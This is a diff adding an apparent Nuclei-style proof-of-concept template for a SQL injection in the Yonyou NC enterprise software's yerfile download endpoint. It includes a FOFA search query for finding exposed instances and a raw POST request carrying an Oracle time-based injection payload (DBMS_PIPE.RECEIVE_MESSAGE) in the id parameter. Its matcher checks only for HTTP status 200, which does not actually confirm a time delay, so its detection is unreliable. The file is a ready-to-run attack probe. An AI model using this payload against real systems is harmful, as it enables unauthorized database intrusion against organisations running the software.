@@ -1,0 +1,36 @@
+id: poc-7285840292
+info:
+  name: 用友NC yerfiledown SQL注入漏洞(XVE-2024-34596)
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+
+    id=1''+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),6)--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
